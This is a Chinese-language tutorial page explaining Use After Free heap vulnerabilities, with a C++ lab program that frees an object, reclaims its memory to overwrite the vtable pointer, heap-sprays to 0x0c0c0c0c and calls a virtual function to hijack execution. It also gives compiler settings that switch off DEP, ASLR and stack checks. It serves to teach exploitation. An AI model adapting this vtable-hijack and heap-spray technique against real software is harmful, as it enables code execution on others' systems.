Use After Free
========================================

简介
----------------------------------------
+ 当申请的一个堆块在释放后，指向该堆块的指针没有清空（置NULL），就形成了一个悬挂指针（dangling pointer），而后再申请出堆块时会将刚刚释放出的堆块申请出来，并复写其内容，而悬挂指针此时仍然可以使用，使得出现了不可控的情况。攻击者一般利用该漏洞进行函数指针的控制，从而劫持程序执行流。
+ 利用条件
	- 具备堆块的"占坑"时间机会

利用方式
-----------------------------------------

类对象
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
由于大多数的堆内存其实都是C++对象，所以利用的核心思路就是分配堆去占坑，占的坑中有自己构造的虚表。
在c++中，如果类中有虚函数（如下图中的 virtual void give_shell()），那么它就是有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。

示例代码：

::

	#include "stdafx.h"
	#include<string>
	#include<stdio.h>

	class attack
	{
	public:
		unsigned int num;
		char buffer[8];
	public:
		attack(unsigned int n) { num = n; };
		virtual ~attack() {};
	public:
		virtual void printnum()
		{
			printf("num=%d\n", num);
		}
	};

	int main()
	{
		_asm int 3;
		
		attack *p1;
		char *p2;

		p1 = new attack(1);
		printf("p1：0x%p,size=%d\n", p1,sizeof(attack));
		delete p1;

		// 分配 p2 去“占坑”p1 的内存位置
		p2 = (char*)malloc(sizeof(attack));
		printf("p2：0x%p,size=%d\n", p2,sizeof(attack));
		memset(p2, 0x0c, 4);	//此处覆盖掉p1类的虚表指针，指向0c0c0c0c的堆喷地址

		char *shellcode=new char[200 * 1024 * 1024];//堆喷,申请大量内存，能够覆盖到0c0c0c0c的地址
		memset(shellcode, 0x0c, 200 * 1024 * 1024);
		memset(shellcode + 200 * 1024 * 1024 - 0x10, 0xcc, 0x10);//shellcode

		printf("==== Use After Free ===\n");
		p1->printnum();	//调用虚函数，[0c0c0c0c]=0c0c0c0c，跳到0c0c0c0c地址执行滑板指令shellcode
		free(p2);
		delete[]shellcode;
		return 0;
	}

利用条件：
 | p1指针free之后没有被重置为NULL
 | p2占坑内存必须可控，即存在malloc()函数可以将新申请分配的空间分配到之前被free()回收的buffer区域。
 | p1被重引用，如果是重新释放即double free漏洞，调用析构函数触发shellcode执行，或者是引用其它成员函数触发shellcode执行。

编译环境：
 | IDE：Visual Studio 2015，release
 | 编译选项：
 | 字符集：使用多字节字符集
 | c/c++->优化->优化：已禁用
 | c/c++->优化->启用内部函数：否
 | c/c++->优化->全程序优化：否
 | c/c++->预处理器->预处理定义：_CRT_SECURE_NO_WARNINGS（或禁用SDL）
 | c/c++->代码生成->安全检查：禁用安全检查（/GS-）
 | 链接器->高级->数据执行保护(DEP)-否
 | 链接器->高级->随机基址-否
 | 附件：`HeapUAF.zip <..//_static//HeapUAF.zip>`_
 
非C++对象的利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~